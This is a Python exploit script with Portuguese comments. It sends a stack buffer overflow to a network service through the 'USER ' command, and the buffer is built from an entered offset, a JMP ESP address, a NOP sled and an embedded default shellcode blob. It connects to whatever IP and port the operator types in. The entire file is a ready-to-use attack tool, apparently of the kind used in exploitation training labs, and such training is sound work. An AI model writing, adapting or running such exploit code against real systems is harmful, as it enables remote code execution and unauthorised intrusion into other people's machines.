import socket
import sys
import time

# Função para construir o buffer com base nas entradas do usuário
def construir_buffer(offset, retn, payload):
    # Parâmetros do exploit
    prefix = b"USER "
    overflow = b"A" * offset
    retn = bytes.fromhex(retn.replace("\\x", ""))
    padding = b"\x90" * 16  # NOP sled

    # Payload (informe o usuário para substituir este shellcode se necessário)
    if not payload:
        print("[!] Usando o payload padrão. Para um exploit real, substitua o payload.")
        payload = (
            b"\xbf\x79\x6e\x88\x91\xd9\xcd\xd9\x74\x24\xf4\x5a"
            b"\x33\xc9\xb1\x52\x31\x7a\x12\x83\xc2\x04\x03\x03"
            b"\x60\x6a\x64\x0f\x94\xe8\x87\xef\x65\x8d\x0e\x0a"
            b"\x54\x8d\x75\x5f\xc7\x3d\xfd\x0d\xe4\xb6\x53\xa5"
            b"\x7f\xba\x7b\xca\xc8\x71\x5a\xe5\xc9\x2a\x9e\x64"
            b"\x4a\x31\xf3\x46\x73\xfa\x06\x87\xb4\xe7\xeb\xd5"
            b"\x6d\x63\x59\xc9\x1a\x39\x62\x62\x50\xaf\xe2\x97"
            b"\x21\xce\xc3\x06\x39\x89\xc3\xa9\xee\xa1\x4d\xb1"
            b"\xf3\x8c\x04\x4a\xc7\x7b\x97\x9a\x19\x83\x34\xe3"
            b"\x95\x76\x44\x24\x11\x69\x33\x5c\x61\x14\x44\x9b"
            b"\x1b\xc2\xc1\x3f\xbb\x81\x72\x9b\x3d\x45\xe4\x68"
            b"\x31\x22\x62\x36\x56\xb5\xa7\x4d\x62\x3e\x46\x81"
            b"\xe2\x04\x6d\x05\xae\xdf\x0c\x1c\x0a\xb1\x31\x7e"
            b"\xf5\x6e\x94\xf5\x18\x7a\xa5\x54\x75\x4f\x84\x66"
            b"\x85\xc7\x9f\x15\xb7\x48\x34\xb1\xfb\x01\x92\x46"
            b"\xfb\x3b\x62\xd8\x02\xc4\x93\xf1\xc0\x90\xc3\x69"
        )

    postfix = b""
    
    # Construindo o buffer final
    buffer = prefix + overflow + retn + padding + payload + postfix
    return buffer

# Função para enviar o exploit
def enviar_exploit(ip, port, buffer):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        print(f"[+] Conectado ao {ip}:{port}")

        # Animação de envio do payload
        print("[+] Enviando payload...", end="")
        for _ in range(3):
            for char in ['/', '-', '\\', '|']:
                print(f"\b{char}", end="", flush=True)
                time.sleep(0.2)

        s.send(buffer + b"\r\n")
        s.close()
        print("\n[+] Payload enviado com sucesso!")

    except socket.error as err:
        print(f"[!] Erro ao conectar-se ao {ip}:{port} - {err}")
    except Exception as e:
        print(f"[!] Erro inesperado: {e}")

# Função principal
def main():
    print("=== Exploit de Buffer Overflow ===")
    
    ip = input("Digite o IP de destino: ").strip()
    try:
        port = int(input("Digite a porta de destino: ").strip())
    except ValueError:
        print("[!] Porta inválida.")
        sys.exit(1)

    # Solicitar o offset
    try:
        offset = int(input("\nDigite o valor do offset: ").strip())
    except ValueError:
        print("[!] Offset inválido.")
        sys.exit(1)
    
    # Solicitar o endereço de JMP ESP
    retn = input("\nDigite o endereço JMP ESP (formato: \\x12\\x34\\x56\\x78): ").strip()
    if not retn.startswith("\\x"):
        print("[!] Formato de endereço inválido.")
        sys.exit(1)

    # Avisar o usuário para substituir o payload se necessário
    print("\n[!] Certifique-se de substituir o payload no código, se necessário.")
    usar_payload_padrao = input("Deseja usar o payload padrão? (s/n): ").strip().lower()
    
    payload = b""
    if usar_payload_padrao != 's':
        print("[!] Para substituir o payload, edite o código manualmente ou utilize um gerador como 'msfvenom'.")
    
    buffer = construir_buffer(offset, retn, payload)
    enviar_exploit(ip, port, buffer)

if __name__ == "__main__":
    main()
